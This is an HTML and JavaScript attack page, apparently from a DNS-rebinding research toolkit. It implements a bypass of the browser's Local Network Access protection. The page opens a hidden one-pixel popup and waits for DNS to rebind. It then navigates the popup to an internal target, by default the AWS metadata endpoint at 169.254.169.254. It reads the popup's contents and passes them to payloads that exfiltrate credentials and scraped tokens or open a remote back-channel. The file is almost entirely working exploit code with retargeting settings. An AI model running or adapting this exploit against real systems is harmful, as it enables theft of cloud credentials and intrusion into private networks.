<!doctype html>
<html lang="en">
<!--
    LNA Navigation Bypass — DNS rebinding via window.open + navigation.

    Chrome and Firefox ship Local Network Access (LNA): even a same-origin
    fetch is blocked if the resolved IP is more local than the requesting
    origin. fetch() is dead for rebinding.

    But top-level navigations are NOT guarded by LNA. This page:
      1. Opens a popup via window.open (same origin, attacker IP)
      2. Polls with fetch("/") until an LNA error fires (= DNS rebind done)
      3. Navigates the popup to targetPath on the rebound origin
      4. Reads the popup's document via the same-origin window reference
      5. Dispatches the response body to the configured payload (e.g. DOM scraper)

    Uses the same CONFIG pattern as amaze.html and the same payload scripts
    from payloads/. Can run with or without the Singularity server — any
    static HTTP server works, as long as payloads/ is served alongside.

    See WIKI.md for the full write-up.
-->
<head>
    <title>LNA Bypass</title>
    <meta charset="utf-8">
    <meta http-equiv="x-dns-prefetch-control" content="off">
    <style>
        body {
            font: 14px/1.6 monospace;
            max-width: 48rem;
            margin: 2rem auto;
            padding: 0 1rem;
            background: #1a1a2e;
            color: #c8c8d4;
        }
        h3 { color: #e94560; margin-bottom: 0.5rem; }
        #status {
            background: #16213e;
            border: 1px solid #0f3460;
            padding: 1rem;
            margin: 1rem 0;
            white-space: pre-wrap;
            word-break: break-all;
            min-height: 8rem;
            max-height: 24rem;
            overflow-y: auto;
        }
        #msg {
            font-size: 1.2rem;
            color: #e94560;
            cursor: pointer;
            padding: 0.8rem;
            background: #16213e;
            border: 1px solid #0f3460;
            text-align: center;
            user-select: none;
        }
        #msg.waiting { color: #f5a623; cursor: default; }
        #msg.success { color: #53d769; cursor: default; }
        .dim { color: #666; }
    </style>
</head>
<body>
    <h3>LNA Navigation Bypass</h3>
    <p class="dim">DNS rebinding via window.open — bypasses Chrome/Firefox Local Network Access.</p>

    <p id="msg">Click to start</p>

    <div id="status"></div>

    <!-- payload.js provides: Registry, sooFetch, httpHeaderstoText -->
    <script src="payload.js"></script>
    <!-- payload scripts register into Registry -->
    <script src="payloads/aws-metadata-exfil.js"></script>
    <script src="payloads/hook-and-control.js"></script>
    <script src="payloads/lna-dom-scraper.js"></script>

    <script>
    // ============================================================
    //  CONFIG  —  edit these to retarget the attack
    //  Same fields as amaze.html where applicable.
    // ============================================================
    const CONFIG = {
        // Attacker infrastructure
        attackHostIPAddress: 'xx.xx.xx.xx',
        attackHostDomain:    'dynamic.your.domain',

        // Target — single source of truth
        targetHostIPAddress: '169.254.169.254',
        targetPort:          '80',
        targetPath:          '/latest/meta-data',

        // Payload — must match a key registered in payloads/*.js
        //   'AWS Metadata Exfil'  → POST rebound response to EXFILTRATION_URL
        //                           in payloads/aws-metadata-exfil.js. One-shot.
        //   'LNA DOM Scraper'    → scrape DOM, forms, tokens, inline scripts from
        //                           initial page + crawl same-origin links. Exfils
        //                           structured JSON. Purpose-built for this bypass.
        //   'Hook and Control'    → open WebSocket back-channel (needs Singularity).
        attackPayload:       'LNA DOM Scraper',

        // Polling interval (ms) while waiting for DNS cache to expire
        pollInterval:        2000,

        // How long to wait (ms) for popup navigation to complete before reading
        navigationWait:      2000,

        // Misc
        wsProxyPort:         3129,
        hideActivity:        false,
    };

    // ============================================================

    if (CONFIG.hideActivity) document.body.style.display = 'none';

    const log = (line) => {
        const el = document.getElementById('status');
        const ts = new Date().toISOString().slice(11, 19);
        el.textContent += '[' + ts + '] ' + line + '\n';
        el.scrollTop = el.scrollHeight;
    };

    const joinUrl = (base, path) =>
        base.replace(/\/+$/, '') + '/' + path.replace(/^\/+/, '');

    const msgEl = document.getElementById('msg');

    if (window.name === "lna_popup") {
        msgEl.innerText = "Popup: waiting for navigation...";
        msgEl.className = "waiting";
    }

    msgEl.onclick = async () => {
        if (window.name === "lna_popup") return;
        msgEl.onclick = null;
        msgEl.className = "waiting";
        msgEl.innerText = "Waiting for DNS rebind (~60s)...";

        log('Target: ' + CONFIG.targetHostIPAddress + ':' + CONFIG.targetPort + CONFIG.targetPath);
        log('Payload: ' + CONFIG.attackPayload);

        // Step 1: open popup on same origin (attacker IP right now)
        const popup = window.open(
            "/",
            "lna_popup",
            "width=1,height=1,top=9999,left=9999"
        );

        if (!popup) {
            log("ERROR: popup blocked. Needs user gesture or allow-popups.");
            msgEl.innerText = "Popup blocked — try again";
            msgEl.className = "";
            msgEl.onclick = arguments.callee;
            return;
        }

        log("Popup opened on attacker origin");
        log("Polling fetch('/') to detect LNA block (DNS rebind)...");

        // Step 2: poll fetch until LNA kills it
        let rebindDetected = false;
        let polls = 0;

        while (!rebindDetected) {
            try {
                await fetch("/", { cache: "reload" });
                polls++;
                if (polls % 10 === 0) log('Still on attacker IP (' + polls + ' polls)...');
            } catch (e) {
                rebindDetected = true;
                log('LNA block after ' + polls + ' polls — rebind detected!');
            }
            if (!rebindDetected) {
                await new Promise(r => setTimeout(r, CONFIG.pollInterval));
            }
        }

        // Step 3: navigate popup to targetPath on the rebound origin.
        // Top-level navigation is NOT guarded by LNA.
        const navPath = joinUrl("/", CONFIG.targetPath);
        log('Navigating popup to ' + navPath + ' via top-level navigation...');
        popup.location = navPath;

        msgEl.innerText = "Rebind successful — reading target...";
        msgEl.className = "success";

        // Step 4: wait for navigation, then read the popup's DOM
        const readPopup = (attempt) => {
            try {
                const doc = popup.document;
                const body = doc.documentElement.outerHTML;
                if (!body || body.length === 0) throw new Error('empty response');
                return body;
            } catch (e) {
                if (attempt > 0) throw e;
                return null;
            }
        };

        await new Promise(r => setTimeout(r, CONFIG.navigationWait));

        let body = null;
        try {
            body = readPopup(0);
            if (!body) {
                log("First read empty, retrying in 3s...");
                await new Promise(r => setTimeout(r, 3000));
                body = readPopup(1);
            }
        } catch (e) {
            log('Read failed: ' + e);
            log("Retrying in 5s...");
            await new Promise(r => setTimeout(r, 5000));
            try {
                body = readPopup(1);
            } catch (e2) {
                log('Retry failed: ' + e2);
                log("Target may require more load time or rebind timing was off.");
                return;
            }
        }

        log('Read ' + body.length + ' bytes from rebound target');
        console.log('[+] rebind success — response:\n' + body);

        // Step 5: dispatch to the configured payload.
        // Expose the popup reference so payloads (e.g. LNA DOM Scraper)
        // can navigate it to crawl additional pages.
        window.__lnaPopup = popup;

        const payloadObj = Registry[CONFIG.attackPayload];
        if (payloadObj) {
            log('Dispatching to payload: ' + CONFIG.attackPayload);
            payloadObj.attack(null, document.cookie, body, CONFIG.wsProxyPort);
        } else {
            log("WARNING: payload '" + CONFIG.attackPayload + "' not found in Registry");
            log('Available: ' + Object.keys(Registry).join(', '));
            log("Response logged to console only.");
        }
    };
    </script>
</body>
</html>
